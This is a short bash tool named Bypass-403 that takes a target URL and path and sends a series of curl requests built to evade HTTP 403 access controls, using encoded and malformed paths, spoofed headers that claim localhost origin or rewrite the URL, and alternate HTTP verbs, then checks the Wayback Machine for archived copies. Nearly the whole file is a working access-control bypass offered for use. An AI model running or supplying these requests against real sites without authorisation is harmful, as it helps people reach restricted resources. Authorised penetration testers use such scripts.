#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "




# Input string
input_string="$1"

# Find the index of the last dot
last_dot_index=$(expr index "$input_string" .)

# Extract the substring starting from the last dot to the end of the string
substring_after_last_dot="${input_string:last_dot_index}"

# Find the index of the first slash in the extracted substring
first_slash_index=$(expr index "$substring_after_last_dot" /)

# Print the substring after the last dot and the position of the first slash
echo "Substring after the last dot: $substring_after_last_dot"
echo "Position of the first slash after the last dot: $((last_dot_index + first_slash_index - 1))"

first_slash_after_dot=$((last_dot_index + first_slash_index - 1))

# Get the two parts of the string
first_part="${input_string:0:first_slash_after_dot}"
second_part="${input_string:first_slash_after_dot+1}"

# Print the split parts
echo "First Part: $first_part"
echo "Second Part: $second_part"




curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part
echo "  --> ${first_part}/${second_part}"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/%2e/$second_part
echo "  --> ${first_part}/%2e/${second_part}"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part/.
echo "  --> ${first_part}/${second_part}/."
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part//$second_part//
echo "  --> ${first_part}//${second_part}//"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/./$second_part/./
echo "  --> ${first_part}/./${second_part}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}" -H "X-Original-URL: $second_part" $first_part/$second_part
echo "  --> ${first_part}/${second_part} -H X-Original-URL: ${second_part}"
curl -k -s -o /dev/null -iL -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" $first_part/$second_part
echo "  --> ${first_part}/${second_part} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}" -H "X-Forwarded-For: http://127.0.0.1" $first_part/$second_part
echo "  --> ${first_part}/${second_part} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1:80" $first_part/$second_part
echo "  --> ${first_part}/${second_part} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}" -H "X-rewrite-url: $second_part" $first_part
echo "  --> ${first_part} -H X-rewrite-url: ${second_part}"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part%20
echo "  --> ${first_part}/${second_part}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part%09
echo "  --> ${first_part}/${second_part}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part?
echo "  --> ${first_part}/${second_part}?"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part.html
echo "  --> ${first_part}/${second_part}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part/?anything
echo "  --> ${first_part}/${second_part}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part#
echo "  --> ${first_part}/${second_part}#"
curl -k -s -o /dev/null -iL -w "%{http_code}" -H "Content-Length:0" -X POST $first_part/$second_part
echo "  --> ${first_part}/${second_part} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part/*
echo "  --> ${first_part}/${second_part}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part.php
echo "  --> ${first_part}/${second_part}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}" $first_part/$second_part.json
echo "  --> ${first_part}/${second_part}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}" -X TRACE $first_part/$second_part
echo "  --> ${first_part}/${second_part}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}" -H "X-Host: 127.0.0.1" $first_part/$second_part
echo "  --> ${first_part}/${second_part} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}" "$first_part/$second_part..;/"
echo "  --> ${first_part}/${second_part}..;/"
curl -s -o /dev/null -iL -w "%{http_code}" " $first_part/$second_part;/"
echo "  --> ${first_part}/${second_part};/"
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}" -X TRACE $first_part/$second_part
echo "  --> ${first_part}/${second_part} -X TRACE"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$first_part/$second_part | jq -r '.archived_snapshots.closest | {available, url}'

